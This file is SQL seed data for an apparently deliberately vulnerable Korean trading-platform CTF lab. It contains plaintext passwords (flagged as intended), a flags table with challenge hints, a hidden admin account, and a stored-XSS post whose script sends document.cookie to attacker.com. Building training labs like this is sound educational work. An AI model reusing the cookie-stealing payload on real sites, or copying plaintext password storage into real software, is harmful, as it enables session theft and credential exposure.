-- KIS Trading Platform - Sample Data
-- CTF 교육용 초기 데이터

SET NAMES utf8mb4;

-- ============================================
-- 역할 데이터
-- ============================================

INSERT INTO `roles` (`id`, `name`, `description`) VALUES
(1, 'admin', '관리자'),
(2, 'user', '일반 사용자');

-- ============================================
-- 사용자 데이터
-- [A04: Cryptographic Failures] 비밀번호 평문 저장!
-- ============================================

INSERT INTO `users` (`id`, `email`, `password`, `name`, `role`, `status`) VALUES
(1, 'admin@kis-trading.com', 'admin123!@#', '관리자', 'admin', 'active'),
(2, 'user1@example.com', 'password123', '홍길동', 'user', 'active'),
(3, 'user2@example.com', 'password123', '김철수', 'user', 'active'),
(4, 'vip@example.com', 'vip2024!', 'VIP 고객', 'user', 'active'),
(5, 'test@example.com', 'test1234', '테스트', 'user', 'suspended');

INSERT INTO `user_roles` (`user_id`, `role_id`) VALUES
(1, 1),
(2, 2),
(3, 2),
(4, 2),
(5, 2);

-- ============================================
-- 종목 데이터
-- ============================================

INSERT INTO `stocks` (`symbol`, `name`, `market`, `sector`) VALUES
('005930', '삼성전자', 'kospi', '전기전자'),
('000660', 'SK하이닉스', 'kospi', '전기전자'),
('035420', 'NAVER', 'kospi', 'IT'),
('035720', '카카오', 'kospi', 'IT'),
('051910', 'LG화학', 'kospi', '화학'),
('006400', '삼성SDI', 'kospi', '전기전자'),
('003550', 'LG', 'kospi', '지주회사'),
('105560', 'KB금융', 'kospi', '금융'),
('055550', '신한지주', 'kospi', '금융'),
('017670', 'SK텔레콤', 'kospi', '통신'),
('030200', 'KT', 'kospi', '통신'),
('032830', '삼성생명', 'kospi', '보험'),
('086790', '하나금융지주', 'kospi', '금융'),
('012330', '현대모비스', 'kospi', '자동차'),
('005380', '현대차', 'kospi', '자동차'),
('000270', '기아', 'kospi', '자동차'),
('066570', 'LG전자', 'kospi', '전기전자'),
('028260', '삼성물산', 'kospi', '건설'),
('096770', 'SK이노베이션', 'kospi', '화학'),
('034730', 'SK', 'kospi', '지주회사'),
('373220', 'LG에너지솔루션', 'kospi', '전기전자'),
('207940', '삼성바이오로직스', 'kospi', '바이오'),
('068270', '셀트리온', 'kosdaq', '바이오'),
('247540', '에코프로비엠', 'kosdaq', '화학'),
('091990', '셀트리온헬스케어', 'kosdaq', '바이오');

-- ============================================
-- KIS 연동 샘플 데이터
-- ============================================

INSERT INTO `kis_links` (`id`, `user_id`, `env`, `access_token`, `access_expired_at`, `refresh_token`) VALUES
(1, 2, 'paper', 'sample_access_token_12345', DATE_ADD(NOW(), INTERVAL 90 DAY), 'sample_refresh_token_12345'),
(2, 4, 'paper', 'vip_access_token_67890', DATE_ADD(NOW(), INTERVAL 90 DAY), 'vip_refresh_token_67890');

INSERT INTO `kis_accounts` (`id`, `kis_link_id`, `cano`, `acnt_prdt_cd`, `alias`) VALUES
(1, 1, '50012345', '01', '홍길동 모의계좌'),
(2, 2, '50067890', '01', 'VIP 모의계좌');

-- ============================================
-- 주문 샘플 데이터
-- ============================================

INSERT INTO `orders` (`user_id`, `kis_account_id`, `symbol`, `side`, `qty`, `price`, `status`, `kis_order_no`, `created_at`) VALUES
(2, 1, '005930', 'buy', 10, 72000.00, 'filled', 'ORD001', DATE_SUB(NOW(), INTERVAL 5 DAY)),
(2, 1, '035420', 'buy', 5, 215000.00, 'filled', 'ORD002', DATE_SUB(NOW(), INTERVAL 3 DAY)),
(2, 1, '005930', 'sell', 5, 73500.00, 'pending', 'ORD003', DATE_SUB(NOW(), INTERVAL 1 DAY)),
(4, 2, '000660', 'buy', 20, 135000.00, 'filled', 'ORD004', DATE_SUB(NOW(), INTERVAL 2 DAY)),
(4, 2, '035720', 'buy', 15, 52000.00, 'filled', 'ORD005', DATE_SUB(NOW(), INTERVAL 1 DAY));

INSERT INTO `fills` (`order_id`, `filled_qty`, `filled_price`, `filled_at`) VALUES
(1, 10, 72000.00, DATE_SUB(NOW(), INTERVAL 5 DAY)),
(2, 5, 215000.00, DATE_SUB(NOW(), INTERVAL 3 DAY)),
(4, 20, 135000.00, DATE_SUB(NOW(), INTERVAL 2 DAY)),
(5, 15, 52000.00, DATE_SUB(NOW(), INTERVAL 1 DAY));

-- ============================================
-- 관심종목 데이터
-- ============================================

INSERT INTO `watchlist` (`user_id`, `symbol`, `name`) VALUES
(2, '005930', '삼성전자'),
(2, '035420', 'NAVER'),
(2, '035720', '카카오'),
(4, '000660', 'SK하이닉스'),
(4, '373220', 'LG에너지솔루션');

-- ============================================
-- 게시판 데이터
-- ============================================

INSERT INTO `posts` (`user_id`, `type`, `title`, `content`, `status`, `views`, `created_at`) VALUES
(1, 'notice', '📢 서비스 오픈 안내', '<h2>KIS Trading Platform 오픈!</h2><p>안녕하세요. KIS Trading Platform이 오픈되었습니다.</p><p>많은 이용 부탁드립니다.</p>', 'published', 156, DATE_SUB(NOW(), INTERVAL 10 DAY)),
(1, 'notice', '🔧 시스템 점검 안내', '<p>2026년 2월 15일 새벽 2시~4시 시스템 점검이 예정되어 있습니다.</p><p>이 시간에는 서비스 이용이 불가합니다.</p>', 'published', 89, DATE_SUB(NOW(), INTERVAL 5 DAY)),
(2, 'free', '삼성전자 전망이 어떨까요?', '<p>최근 반도체 경기가 좋아지고 있는데, 삼성전자 주가 전망이 어떨까요?</p><p>의견 부탁드립니다.</p>', 'published', 234, DATE_SUB(NOW(), INTERVAL 3 DAY)),
(3, 'free', '주식 초보입니다', '<p>주식을 처음 시작하는데 어떤 종목부터 시작하면 좋을까요?</p>', 'published', 67, DATE_SUB(NOW(), INTERVAL 2 DAY)),
(4, 'qna', '모의투자 계좌 연결 문의', '<p>모의투자 계좌 연결이 안되는데 어떻게 해야 하나요?</p>', 'published', 45, DATE_SUB(NOW(), INTERVAL 1 DAY));

-- XSS 공격 테스트용 게시글
INSERT INTO `posts` (`user_id`, `type`, `title`, `content`, `status`, `views`, `created_at`) VALUES
(2, 'free', '테스트 게시글<script>alert("XSS")</script>', '<p>이 게시글은 XSS 테스트용입니다.</p><script>document.location="http://attacker.com?cookie="+document.cookie</script>', 'published', 12, NOW());

INSERT INTO `comments` (`post_id`, `user_id`, `content`, `created_at`) VALUES
(3, 3, '저도 궁금합니다!', DATE_SUB(NOW(), INTERVAL 2 DAY)),
(3, 4, '장기 투자하시면 괜찮을 것 같아요.', DATE_SUB(NOW(), INTERVAL 1 DAY)),
(4, 2, 'ETF부터 시작하시는 걸 추천드립니다.', DATE_SUB(NOW(), INTERVAL 1 DAY));

-- ============================================
-- 민원 데이터
-- ============================================

INSERT INTO `tickets` (`user_id`, `title`, `content`, `priority`, `status`, `response`, `responded_at`, `created_at`) VALUES
(2, '계좌 연결 오류', '계좌 연결 시 오류가 발생합니다. 확인 부탁드립니다.', 'high', 'closed', '확인 결과 일시적인 KIS 서버 오류였습니다. 현재는 정상화되었습니다.', DATE_SUB(NOW(), INTERVAL 1 DAY), DATE_SUB(NOW(), INTERVAL 3 DAY)),
(3, '주문이 체결되지 않아요', '어제 주문한 삼성전자 매수 주문이 아직 체결되지 않았습니다.', 'normal', 'in_progress', NULL, NULL, DATE_SUB(NOW(), INTERVAL 1 DAY)),
(4, '수수료 문의', '주식 거래 수수료는 어떻게 되나요?', 'low', 'open', NULL, NULL, NOW());

-- ============================================
-- 감사 로그 데이터
-- ============================================

INSERT INTO `audit_logs` (`actor_id`, `action`, `target_type`, `target_id`, `ip`, `detail_json`, `created_at`) VALUES
(1, 'LOGIN', 'user', 1, '192.168.1.100', '{"success": true}', DATE_SUB(NOW(), INTERVAL 5 DAY)),
(2, 'LOGIN', 'user', 2, '192.168.1.101', '{"success": true}', DATE_SUB(NOW(), INTERVAL 3 DAY)),
(2, 'ORDER_PLACED', 'order', 1, '192.168.1.101', '{"symbol": "005930", "qty": 10}', DATE_SUB(NOW(), INTERVAL 3 DAY)),
(1, 'USER_STATUS_CHANGE', 'user', 5, '192.168.1.100', '{"old_status": "active", "new_status": "suspended"}', DATE_SUB(NOW(), INTERVAL 2 DAY)),
(4, 'LOGIN', 'user', 4, '192.168.1.102', '{"success": true}', DATE_SUB(NOW(), INTERVAL 1 DAY));

-- ============================================
-- 에러 로그 데이터
-- ============================================

INSERT INTO `error_logs` (`user_id`, `kis_account_id`, `source`, `error_code`, `error_message`, `request_json`, `created_at`) VALUES
(2, 1, 'kis', 'AUTH001', '토큰 만료', '{"endpoint": "/trading/order"}', DATE_SUB(NOW(), INTERVAL 2 DAY)),
(3, NULL, 'kis', 'NET001', '네트워크 오류', '{"endpoint": "/oauth2/token"}', DATE_SUB(NOW(), INTERVAL 1 DAY));

-- ============================================
-- 플래그 데이터 (CTF용)
-- ============================================

-- 플래그 테이블 생성
CREATE TABLE IF NOT EXISTS `flags` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` VARCHAR(100) NOT NULL,
  `flag` VARCHAR(255) NOT NULL,
  `hint` TEXT,
  `points` INT DEFAULT 100,
  `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `flags` (`name`, `flag`, `hint`, `points`) VALUES
('SQL_INJECTION', 'FLAG{SQL_1nj3ct10n_M4st3r_2025}', 'SQL Injection을 통해 이 플래그를 찾으세요', 100),
('XSS_STORED', 'FLAG{St0r3d_XSS_4tt4ck_Succ3ss}', 'Stored XSS를 통해 이 플래그를 찾으세요', 100),
('IDOR', 'FLAG{1D0R_4cc3ss_C0ntr0l_Byp4ss}', 'IDOR 취약점을 통해 다른 사용자 정보에 접근하세요', 100),
('PRIVILEGE_ESCALATION', 'FLAG{Pr1v1l3g3_3sc4l4t10n_W1n}', '권한 상승을 통해 관리자가 되세요', 150),
('FILE_UPLOAD', 'FLAG{D4ng3r0us_F1l3_Upl04d}', '위험한 파일을 업로드하세요', 100),
('PATH_TRAVERSAL', 'FLAG{P4th_Tr4v3rs4l_LF1_Succ3ss}', '경로 탐색을 통해 시스템 파일에 접근하세요', 150),
('COMMAND_INJECTION', 'FLAG{C0mm4nd_1nj3ct10n_RCE}', '명령어 인젝션을 통해 시스템 명령을 실행하세요', 200),
('WEAK_CRYPTO', 'FLAG{W34k_Crypt0_1s_N0_Crypt0}', '약한 암호화를 공격하세요', 100),
('TOKEN_LEAK', 'FLAG{T0k3n_L34k_1n_R3sp0ns3}', 'API 응답에서 민감한 토큰을 찾으세요', 100),
('ADMIN_BYPASS', 'FLAG{4dm1n_4cc3ss_W1th0ut_4uth}', '관리자 인증을 우회하세요', 150);

-- 비밀 사용자 (SQL Injection으로 발견)
INSERT INTO `users` (`id`, `email`, `password`, `name`, `role`, `status`) VALUES
(99, 'secret_admin@internal.com', 'sup3r_s3cr3t_p4ss!', 'Secret Admin - FLAG{SQL_1nj3ct10n_M4st3r_2025}', 'admin', 'active');

-- ============================================
-- 모의투자 초기 데이터
-- ============================================

-- 사용자 계좌 (초기 현금 1억원)
INSERT INTO `user_accounts` (`user_id`, `cash_balance`) VALUES
(1, 100000000.00),
(2, 100000000.00),
(3, 100000000.00),
(4, 100000000.00),
(5, 100000000.00);

-- 샘플 포트폴리오 (VIP 고객 - user 4)
INSERT INTO `portfolio` (`user_id`, `symbol`, `quantity`, `avg_price`, `total_cost`) VALUES
(4, 'AAPL', 50, 180.50, 9025.00),
(4, 'MSFT', 30, 420.00, 12600.00),
(4, 'TSLA', 20, 250.00, 5000.00);

-- VIP 현금 차감 (보유 종목 매입)
UPDATE `user_accounts` SET `cash_balance` = 100000000 - 9025 - 12600 - 5000 WHERE `user_id` = 4;

-- 샘플 주문 내역
INSERT INTO `orders` (`user_id`, `symbol`, `side`, `order_type`, `qty`, `price`, `filled_qty`, `filled_price`, `status`, `created_at`, `filled_at`) VALUES
(4, 'AAPL', 'buy', 'market', 50, 180.50, 50, 180.50, 'filled', DATE_SUB(NOW(), INTERVAL 5 DAY), DATE_SUB(NOW(), INTERVAL 5 DAY)),
(4, 'MSFT', 'buy', 'market', 30, 420.00, 30, 420.00, 'filled', DATE_SUB(NOW(), INTERVAL 3 DAY), DATE_SUB(NOW(), INTERVAL 3 DAY)),
(4, 'TSLA', 'buy', 'market', 20, 250.00, 20, 250.00, 'filled', DATE_SUB(NOW(), INTERVAL 1 DAY), DATE_SUB(NOW(), INTERVAL 1 DAY)),
(2, 'GOOGL', 'buy', 'limit', 10, 150.00, NULL, NULL, 'pending', NOW(), NULL);

-- 관심종목 (US 종목 추가)
INSERT INTO `watchlist` (`user_id`, `symbol`, `name`) VALUES
(2, 'AAPL', 'Apple Inc.'),
(2, 'MSFT', 'Microsoft Corporation'),
(2, 'GOOGL', 'Alphabet Inc.'),
(4, 'NVDA', 'NVIDIA Corporation'),
(4, 'META', 'Meta Platforms Inc.');

